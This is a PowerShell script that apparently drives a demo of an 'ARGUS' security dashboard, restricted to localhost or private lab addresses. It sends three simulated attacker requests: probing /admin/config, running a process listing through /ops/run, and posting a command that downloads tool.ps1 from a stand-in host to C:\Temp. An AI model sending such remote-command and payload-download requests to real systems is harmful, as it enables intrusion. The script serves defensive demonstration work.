[CmdletBinding()]
param(
    [string]$Target = "127.0.0.1",
    [ValidateRange(1, 65535)]
    [int]$HttpPort = 8088
)

$ErrorActionPreference = "Stop"

function Test-PrivateTarget {
    param([string]$HostName)

    if ($HostName -eq "localhost") { return $true }
    $parsedAddress = $null
    if (-not [Net.IPAddress]::TryParse($HostName, [ref]$parsedAddress)) { return $false }
    if ([Net.IPAddress]::IsLoopback($parsedAddress)) { return $true }
    if ($parsedAddress.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork) {
        return $false
    }
    $octets = $parsedAddress.GetAddressBytes()
    return $octets[0] -eq 10 -or
        ($octets[0] -eq 172 -and $octets[1] -ge 16 -and $octets[1] -le 31) -or
        ($octets[0] -eq 192 -and $octets[1] -eq 168)
}

if (-not (Test-PrivateTarget $Target)) {
    throw "Refusing target '$Target'. Use localhost or a private lab IPv4 address."
}

Add-Type -AssemblyName System.Net.Http
$httpClient = [Net.Http.HttpClient]::new()
$httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("PowerShell-ARGUS-Demo/1.0")
$baseUrl = "http://${Target}:$HttpPort"

function Send-ArgusRequest {
    param(
        [string]$Label,
        [Net.Http.HttpMethod]$Method,
        [string]$Path,
        [string]$JsonBody = ""
    )

    $request = [Net.Http.HttpRequestMessage]::new($Method, "$baseUrl$Path")
    if ($JsonBody) {
        $request.Content = [Net.Http.StringContent]::new(
            $JsonBody,
            [Text.Encoding]::UTF8,
            "application/json"
        )
    }
    $response = $null
    try {
        $response = $httpClient.SendAsync($request).GetAwaiter().GetResult()
        $content = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        Write-Host "`n[$Label] $([int]$response.StatusCode) $($response.ReasonPhrase)" -ForegroundColor Cyan
        Write-Host ($content.Substring(0, [Math]::Min(500, $content.Length)))
    }
    finally {
        if ($null -ne $response) { $response.Dispose() }
        $request.Dispose()
    }
}

try {
    Send-ArgusRequest "HTTP reconnaissance" ([Net.Http.HttpMethod]::Get) "/admin/config"
    Send-ArgusRequest "System discovery" ([Net.Http.HttpMethod]::Post) "/ops/run" (
        @{ command = "Get-Process | Select-Object Name,Id" } | ConvertTo-Json -Compress
    )
    Send-ArgusRequest "Payload transfer" ([Net.Http.HttpMethod]::Post) "/api/jobs" (
        @{ command = "Invoke-WebRequest http://lab.invalid/tool.ps1 -OutFile C:\Temp\tool.ps1" } |
            ConvertTo-Json -Compress
    )
}
finally {
    $httpClient.Dispose()
}

Write-Host "`nExpected dashboard result: 3 new HTTP sessions and 3 new attacker actions." -ForegroundColor Green
Write-Host "Select each session to inspect PowerShell intent, telemetry, and the SOC + RAG report."
